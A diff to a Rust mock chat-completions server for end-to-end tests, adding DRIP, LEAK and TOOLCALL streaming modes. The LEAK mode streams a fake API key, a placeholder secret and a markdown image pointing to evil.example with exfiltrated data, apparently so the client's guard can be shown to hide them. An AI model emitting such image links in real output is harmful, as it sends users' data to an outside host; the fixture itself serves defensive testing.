@@ -8,14 +8,62 @@
 //! * `POST /v1/chat/completions`  -> "MOCK ANSWER: saw N chars; attachment=…"
 //!   (JSON, or server-sent events when the request has `"stream": true`);
 //!   a request containing `SLOW` waits 2 s first (busy-state tests)
+//!
+//! Streaming modes (keyword in the last user message, `"stream": true` only),
+//! sent as separate network writes with a delay so a browser sees each one:
+//! * `DRIP`     a long answer, one word every 60 ms
+//! * `LEAK`     an answer with an API key, a `key = value` secret and a
+//!   markdown exfil image, 3 bytes every 15 ms (the guard must hide all three)
+//! * `TOOLCALL` streams some text, then asks for a tool; after the tool
+//!   result comes back, answers normally (exercises the `reset` event)
 
 use std::net::SocketAddr;
+use std::time::Duration;
 
 use axum::Router;
+use axum::body::Body;
 use axum::http::header;
 use axum::response::{IntoResponse, Response};
 use axum::routing::{get, post};
+use futures_util::StreamExt;
 use serde_json::{Value, json};
+
+/// Leaked on purpose by `LEAK`; the e2e suite asserts none of these markers
+/// is ever on screen.
+const LEAK_ANSWER: &str = "Here is the key sk-ant-api03-ABCDEFGHIJKLMNOPQRSTUVWXYZ012345 and \
+    api_key = s3cr3tvalue then ![p](https://evil.example/c?d=EXFILDATA) and more words \
+    follow here so the stream keeps going for a while longer. ";
+
+fn sse(ev: &Value) -> String {
+    format!("data: {ev}\n\n")
+}
+
+fn delta(text: &str) -> String {
+    sse(&json!({"model":"qwen3:8b","choices":[{"delta":{"content":text}}]}))
+}
+
+/// One network write per event, `pause` apart.
+fn sse_response(mut events: Vec<String>, pause: Duration) -> Response {
+    events.push("data: [DONE]\n\n".into());
+    let body = futures_util::stream::iter(events).then(move |e| async move {
+        if !pause.is_zero() {
+            tokio::time::sleep(pause).await;
+        }
+        Ok::<_, std::convert::Infallible>(e)
+    });
+    (
+        [(header::CONTENT_TYPE, "text/event-stream")],
+        Body::from_stream(body),
+    )
+        .into_response()
+}
+
+fn chunks(s: &str, n: usize) -> Vec<String> {
+    let cs: Vec<char> = s.chars().collect();
+    cs.chunks(n)
+        .map(|c| delta(&c.iter().collect::<String>()))
+        .collect()
+}
 
 async fn models() -> Response {
     axum::Json(json!({"data":[{"id":"qwen3:8b"}]})).into_response()
@@ -66,13 +114,42 @@ async fn chat(axum::Json(req): axum::Json<Value>) -> Response {
         return axum::Json(json!({"model":"qwen3:8b","choices":[{"message":{"role":"assistant","content":answer}}]}))
             .into_response();
     }
-    let mut body = String::new();
-    for w in answer.split_inclusive(' ') {
-        let ev = json!({"model":"qwen3:8b","choices":[{"delta":{"content":w}}]});
-        body.push_str(&format!("data: {ev}\n\n"));
+    let msgs = req["messages"].as_array().cloned().unwrap_or_default();
+    let user = msgs
+        .iter()
+        .rev()
+        .find(|m| m["role"] == "user")
+        .map(|m| m["content"].to_string())
+        .unwrap_or_default();
+    let after_tool = msgs.iter().any(|m| m["role"] == "tool");
+    if user.contains("LEAK") {
+        return sse_response(chunks(LEAK_ANSWER, 3), Duration::from_millis(15));
     }
-    body.push_str("data: [DONE]\n\n");
-    ([(header::CONTENT_TYPE, "text/event-stream")], body).into_response()
+    if user.contains("TOOLCALL") && !after_tool {
+        let tool = req["tools"][0]["function"]["name"]
+            .as_str()
+            .unwrap_or("net_connections")
+            .to_owned();
+        let mut ev: Vec<String> = "Let me look that up in the tools before answering you. "
+            .split_inclusive(' ')
+            .map(delta)
+            .collect();
+        ev.push(sse(&json!({"model":"qwen3:8b","choices":[{"delta":{"tool_calls":[
+            {"index":0,"id":"call_1","type":"function","function":{"name":tool,"arguments":"{}"}}
+        ]}}]})));
+        return sse_response(ev, Duration::from_millis(60));
+    }
+    if user.contains("DRIP") || user.contains("TOOLCALL") {
+        let long: String = std::iter::once(format!("{answer} "))
+            .chain((0..30).map(|i| format!("lorem{i} ")))
+            .collect();
+        let ev = long.split_inclusive(' ').map(delta).collect();
+        return sse_response(ev, Duration::from_millis(60));
+    }
+    sse_response(
+        answer.split_inclusive(' ').map(delta).collect(),
+        Duration::ZERO,
+    )
 }
 
 #[tokio::main]
